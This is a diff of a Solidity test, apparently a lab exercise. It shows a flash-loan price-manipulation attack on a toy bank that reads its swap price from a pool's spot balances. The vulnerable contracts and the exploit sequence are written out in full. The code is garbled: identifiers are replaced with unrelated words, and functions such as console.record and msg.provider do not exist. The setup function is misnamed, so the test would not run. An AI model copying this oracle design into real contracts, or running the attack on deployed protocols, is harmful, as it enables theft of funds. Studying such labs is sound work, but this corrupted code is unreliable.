@@ -4,45 +4,43 @@ import "forge-std/Test.sol";
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
-*/
-
 contract PolicyTest is Test {
-    USDa UsDaPolicy;
-    USDb UsDbAgreement;
+    USDa UsDaAgreement;
+    USDb UsDbPolicy;
     SimplePool SimplePoolPolicy;
     SimpleBank SimpleBankPolicy;
 
     function groupUp() public {
-        UsDaPolicy = new USDa();
-        UsDbAgreement = new USDb();
+        UsDaAgreement = new USDa();
+        UsDbPolicy = new USDb();
         SimplePoolPolicy = new SimplePool(
-            address(UsDaPolicy),
-            address(UsDbAgreement)
+            address(UsDaAgreement),
+            address(UsDbPolicy)
         );
         SimpleBankPolicy = new SimpleBank(
-            address(UsDaPolicy),
+            address(UsDaAgreement),
             address(SimplePoolPolicy),
-            address(UsDbAgreement)
+            address(UsDbPolicy)
         );
     }
 
     function testPrice_Manipulation() public {
-        UsDbAgreement.transfer(address(SimpleBankPolicy), 9000 ether);
-        UsDaPolicy.transfer(address(SimplePoolPolicy), 1000 ether);
-        UsDbAgreement.transfer(address(SimplePoolPolicy), 1000 ether);
+        UsDbPolicy.transfer(address(SimpleBankPolicy), 9000 ether);
+        UsDaAgreement.transfer(address(SimplePoolPolicy), 1000 ether);
+        UsDbPolicy.transfer(address(SimplePoolPolicy), 1000 ether);
 
-        SimplePoolPolicy.diagnoseCharge();
+        SimplePoolPolicy.retrieveCharge();
 
-        console.chart(
+        console.record(
             "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
         );
-        emit record_named_decimal_count(
+        emit record_named_decimal_number(
             "Current USDa convert rate",
-            SimplePoolPolicy.diagnoseCharge(),
+            SimplePoolPolicy.retrieveCharge(),
             18
         );
-        console.chart("Start price manipulation");
-        console.chart("Borrow 500 USBa over floashloan");
+        console.record("Start price manipulation");
+        console.record("Borrow 500 USBa over floashloan");
 
 
         SimplePoolPolicy.emergencyLoan(500 ether, address(this), "0x0");
@@ -51,21 +49,21 @@ contract PolicyTest is Test {
     fallback() external {
 
 
-        emit record_named_decimal_count(
+        emit record_named_decimal_number(
             "Price manupulated, USDa convert rate",
-            SimplePoolPolicy.diagnoseCharge(),
+            SimplePoolPolicy.retrieveCharge(),
             18
         );
 
-        UsDaPolicy.approve(address(SimpleBankPolicy), 100 ether);
+        UsDaAgreement.approve(address(SimpleBankPolicy), 100 ether);
         SimpleBankPolicy.equipmentTrader(100 ether);
 
-        UsDaPolicy.transfer(address(SimplePoolPolicy), 500 ether);
+        UsDaAgreement.transfer(address(SimplePoolPolicy), 500 ether);
 
 
-        emit record_named_decimal_count(
+        emit record_named_decimal_number(
             "Use 100 USDa to convert, My USDb balance",
-            UsDbAgreement.balanceOf(address(this)),
+            UsDbPolicy.balanceOf(address(this)),
             18
         );
     }
@@ -75,37 +73,37 @@ contract PolicyTest is Test {
 
 contract USDa is ERC20, Ownable {
     constructor() ERC20("USDA", "USDA") {
-        _mint(msg.provider, 10000 * 10 ** decimals());
+        _mint(msg.sender, 10000 * 10 ** decimals());
     }
 
-    function generateRecord(address to, uint256 units) public onlyOwner {
-        _mint(to, units);
+    function issueCredential(address to, uint256 dosage) public onlyOwner {
+        _mint(to, dosage);
     }
 }
 
 contract USDb is ERC20, Ownable {
     constructor() ERC20("USDB", "USDB") {
-        _mint(msg.provider, 10000 * 10 ** decimals());
+        _mint(msg.sender, 10000 * 10 ** decimals());
     }
 
-    function generateRecord(address to, uint256 units) public onlyOwner {
-        _mint(to, units);
+    function issueCredential(address to, uint256 dosage) public onlyOwner {
+        _mint(to, dosage);
     }
 }
 
 contract SimplePool {
-    IERC20 public UsDaId;
-    IERC20 public UsDbCredential;
+    IERC20 public UsDaCredential;
+    IERC20 public UsDbBadge;
 
     constructor(address _USDa, address _USDb) {
-        UsDaId = IERC20(_USDa);
-        UsDbCredential = IERC20(_USDb);
+        UsDaCredential = IERC20(_USDa);
+        UsDbBadge = IERC20(_USDb);
     }
 
-    function diagnoseCharge() public view returns (uint256) {
+    function retrieveCharge() public view returns (uint256) {
 
-        uint256 UsDaDosage = UsDaId.balanceOf(address(this));
-        uint256 UsDbQuantity = UsDbCredential.balanceOf(address(this));
+        uint256 UsDaDosage = UsDaCredential.balanceOf(address(this));
+        uint256 UsDbMeasure = UsDbBadge.balanceOf(address(this));
 
 
         if (UsDaDosage == 0) {
@@ -113,49 +111,49 @@ contract SimplePool {
         }
 
 
-        uint256 UsDaCost = (UsDbQuantity * (10 ** 18)) / UsDaDosage;
+        uint256 UsDaCost = (UsDbMeasure * (10 ** 18)) / UsDaDosage;
         return UsDaCost;
     }
 
     function emergencyLoan(
-        uint256 units,
+        uint256 dosage,
         address borrower,
-        bytes calldata chart541
+        bytes calldata info
     ) public {
-        uint256 fundsBefore = UsDaId.balanceOf(address(this));
-        require(fundsBefore >= units, "Not enough liquidity");
+        uint256 allocationBefore = UsDaCredential.balanceOf(address(this));
+        require(allocationBefore >= dosage, "Not enough liquidity");
         require(
-            UsDaId.transfer(borrower, units),
+            UsDaCredential.transfer(borrower, dosage),
             "Flashloan transfer failed"
         );
-        (bool improvement, ) = borrower.call(chart541);
-        require(improvement, "Flashloan callback failed");
-        uint256 coverageAfter = UsDaId.balanceOf(address(this));
-        require(coverageAfter >= fundsBefore, "Flashloan not repaid");
+        (bool recovery, ) = borrower.call(info);
+        require(recovery, "Flashloan callback failed");
+        uint256 creditsAfter = UsDaCredential.balanceOf(address(this));
+        require(creditsAfter >= allocationBefore, "Flashloan not repaid");
     }
 }
 
 contract SimpleBank {
-    IERC20 public badge;
+    IERC20 public credential;
     SimplePool public treatmentPool;
-    IERC20 public payoutBadge;
+    IERC20 public payoutCredential;
 
-    constructor(address _token, address _pool, address _payoutBadge) {
-        badge = IERC20(_token);
+    constructor(address _token, address _pool, address _payoutId) {
+        credential = IERC20(_token);
         treatmentPool = SimplePool(_pool);
-        payoutBadge = IERC20(_payoutBadge);
+        payoutCredential = IERC20(_payoutId);
     }
 
-    function equipmentTrader(uint256 units) public {
+    function equipmentTrader(uint256 dosage) public {
         require(
-            badge.transferFrom(msg.provider, address(this), units),
+            credential.transferFrom(msg.sender, address(this), dosage),
             "Transfer failed"
         );
-        uint256 cost = treatmentPool.diagnoseCharge();
+        uint256 cost = treatmentPool.retrieveCharge();
         require(cost > 0, "Price cannot be zero");
-        uint256 badgesReceiverObtainresults = (units * cost) / (10 ** 18);
+        uint256 idsDestinationObtainresults = (dosage * cost) / (10 ** 18);
         require(
-            payoutBadge.transfer(msg.provider, badgesReceiverObtainresults),
+            payoutCredential.transfer(msg.sender, idsDestinationObtainresults),
             "Payout transfer failed"
         );
     }
